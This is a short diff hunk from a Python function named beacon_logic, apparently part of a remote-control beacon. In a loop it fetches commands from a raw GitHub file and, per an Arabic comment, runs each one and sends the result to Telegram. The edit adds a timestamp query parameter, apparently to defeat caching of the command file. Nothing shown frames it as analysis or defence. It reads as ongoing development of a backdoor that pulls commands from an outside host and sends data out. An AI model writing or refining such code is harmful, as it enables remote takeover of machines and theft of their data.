@@ -37,7 +37,7 @@ def beacon_logic():
     CMD_URL = "https://raw.githubusercontent.com/b1do404/My-Python-Practise/refs/heads/main/test/cmd.txt"
     while True:
         try:
-            r = requests.get(CMD_URL, timeout=10)
+            r = requests.get(f"{CMD_URL}?t={int(time.time())}", timeout=10)
             cmd = r.text.strip()
             if cmd != "sleep":
                 # تنفيذ الأمر وإرسال النتيجة لتليجرام
